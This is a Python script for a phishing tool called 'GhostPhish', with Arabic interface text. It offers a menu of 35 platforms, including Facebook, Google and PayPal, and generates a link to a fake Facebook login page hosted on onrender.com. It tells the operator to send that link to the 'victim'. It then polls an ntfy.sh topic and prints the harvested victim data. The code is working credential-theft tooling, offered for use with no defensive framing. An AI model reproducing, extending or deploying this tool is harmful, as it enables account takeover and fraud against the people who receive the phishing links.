#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import urllib.request
import urllib.parse
import json
import os
import uuid
import threading
import time
import sys

# ========== ألوان الصورة بالضبط ==========
ORANGE = "\033[38;5;208m"   # برتقالي للشعار
RED = '\033[91m'            # أحمر للأقواس والأرقام (مثل الصورة)
WHITE = '\033[97m'          # أبيض للنصوص العادية والإطارات
BOLD = '\033[1m'
RESET = '\033[0m'
# ==========================================

CONFIG_FILE = "ghostphish_config.json"

# ─── المنصات الـ 35 بالضبط كما في الصورة (إنجليزي) ───
PLATFORMS = {
    1: "Facebook", 2: "Instagram", 3: "Google", 4: "Microsoft", 5: "Netflix",
    6: "Paypal", 7: "Steam", 8: "Twitter", 9: "Playstation", 10: "Tiktok",
    11: "Twitch", 12: "Pinterest", 13: "Snapchat", 14: "LinkedIn", 15: "Ebay",
    16: "Quora", 17: "Protonmail", 18: "Spotify", 19: "Reddit", 20: "Adobe",
    21: "DeviantArt", 22: "Badoo", 23: "Origin", 24: "DropBox", 25: "Yahoo",
    26: "Wordpress", 27: "Yandex", 28: "StackoverFlow", 29: "Vk", 30: "XBOX",
    31: "Mediafire", 32: "Gitlab", 33: "Github", 34: "Discord", 35: "Roblox"
}

# الروابط (فعلت فيسبوك فقط كمثال، الباقي فارغ)
LINKS = {i: "" for i in range(1, 36)}
LINKS[1] = "https://facebook-vjj9.onrender.com"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_or_create_secret():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            data = json.load(f)
            return data.get("secret", "")
    secret = "GhostPhish_" + uuid.uuid4().hex[:12]
    with open(CONFIG_FILE, "w") as f:
        json.dump({"secret": secret}, f)
    return secret

def print_banner():
    banner = f"""{ORANGE}
   ______              __  ____  __    _     __
  / ____/__  ____  ____/ /_/ __ \/ /_  (_)___/ /_
 / / __/ _ \/ __ \/ ___/ __/ /_/ / __ \/ / __/ __/
/ /_/ /  __/ /_/ (__  ) /_/ ____/ / / / (__  ) / / /
\____/\___/\____/____/\__/_/   /_/ /_/_/____/_/ /_/
{RESET}"""
    print(banner)
    print(WHITE + "Version : 2.3.5" + RESET)
    print(WHITE + "[–] Tool Created by htr-tech (tahmid.rayat)" + RESET)
    print(WHITE + "[::] Select An Attack For Your Victim [::]" + RESET)

def print_menu():
    # 3 أعمدة: العمود1 (1-10)، العمود2 (11-20)، العمود3 (21-30)
    # ثم صف منفصل لـ 31,32,33 وآخر لـ 34,35
    print(WHITE + "═" * 60 + RESET)

    # الصفوف من 1 إلى 10 (ثلاثة أعمدة)
    for i in range(1, 11):
        col1_num = i
        col2_num = i + 10
        col3_num = i + 20

        col1 = f"{RED}[{col1_num:02d}]{RESET} {WHITE}{PLATFORMS[col1_num]}{RESET}"
        col2 = f"{RED}[{col2_num:02d}]{RESET} {WHITE}{PLATFORMS[col2_num]}{RESET}"
        col3 = f"{RED}[{col3_num:02d}]{RESET} {WHITE}{PLATFORMS[col3_num]}{RESET}"
        
        # ضبط المسافات لتكون 3 أعمدة واضحة (كل عمود عرضه ~18 حرف)
        print(f"{col1:<20} {col2:<20} {col3}")

    # الصف الحادي عشر: 31, 32, 33
    col1 = f"{RED}[31]{RESET} {WHITE}{PLATFORMS[31]}{RESET}"
    col2 = f"{RED}[32]{RESET} {WHITE}{PLATFORMS[32]}{RESET}"
    col3 = f"{RED}[33]{RESET} {WHITE}{PLATFORMS[33]}{RESET}"
    print(f"{col1:<20} {col2:<20} {col3}")

    # الصف الثاني عشر: 34, 35 (فقط عمودين)
    col1 = f"{RED}[34]{RESET} {WHITE}{PLATFORMS[34]}{RESET}"
    col2 = f"{RED}[35]{RESET} {WHITE}{PLATFORMS[35]}{RESET}"
    print(f"{col1:<20} {col2}")

    print(WHITE + "═" * 60 + RESET)
    print(f"{RED}[99]{RESET} {WHITE}About{RESET}    {RED}[00]{RESET} {WHITE}Exit{RESET}")
    print(WHITE + "[–] Select an option : " + RESET, end="")

def display_victim_data(message):
    print("\n" + WHITE + "═" * 40 + RESET)
    print(WHITE + BOLD + "  📩 بيانات ضحية جديدة" + RESET)
    print(WHITE + "═" * 40 + RESET)
    lines = message.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if ':' in line:
            key, val = line.split(':', 1)
            print(f"{WHITE}{BOLD}{key.strip()}{RESET}: {WHITE}{val.strip()}{RESET}")
        else:
            print(f"{WHITE}{line}{RESET}")
    print(WHITE + "═" * 40 + RESET + "\n")

def listen_ntfy(topic):
    url = f"https://ntfy.sh/{topic}/json"
    while True:
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=300) as response:
                for line in response:
                    if line:
                        try:
                            data = json.loads(line.decode('utf-8'))
                            if 'message' in data:
                                display_victim_data(data['message'])
                        except:
                            pass
        except Exception:
            time.sleep(5)

def main():
    secret = load_or_create_secret()
    clear_screen()
    print_banner()
    print(f"{WHITE}🔑 مفتاحك السري: {RED}{secret}{RESET}\n")
    threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
    time.sleep(1)

    while True:
        print_menu()
        choice = input().strip()

        if choice == "00" or choice == "0":
            print(f"{WHITE}إيقاف الأداة...{RESET}")
            sys.exit(0)

        if choice == "99":
            clear_screen()
            print_banner()
            print(f"{WHITE}هذه أداة GhostPhish – إصدار 2.3.5{RESET}")
            input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
            clear_screen()
            print_banner()
            continue

        if choice.isdigit():
            num = int(choice)
            if 1 <= num <= 35:
                if LINKS[num] == "":
                    clear_screen()
                    print_banner()
                    print(f"{WHITE}❌ منصة {PLATFORMS[num]} غير مفعلة بعد.{RESET}")
                    input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                    clear_screen()
                    print_banner()
                else:
                    link = LINKS[num] + "?topic=" + secret
                    clear_screen()
                    print_banner()
                    print(WHITE + "═" * 40 + RESET)
                    print(f"{WHITE}✅ رابط {PLATFORMS[num]}:{RESET}")
                    print(f"{RED}{BOLD}{link}{RESET}")
                    print(WHITE + "═" * 40 + RESET)
                    print(f"{WHITE}انسخ الرابط وأرسله للضحية.{RESET}")
                    input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                    clear_screen()
                    print_banner()
            else:
                clear_screen()
                print_banner()
                print(f"{WHITE}رقم غير صحيح (استخدم 01-35 أو 99/00){RESET}")
                input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                clear_screen()
                print_banner()
        else:
            clear_screen()
            print_banner()
            print(f"{WHITE}اختيار غير مفهوم{RESET}")
            input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
            clear_screen()
            print_banner()

if __name__ == "__main__":
    main()
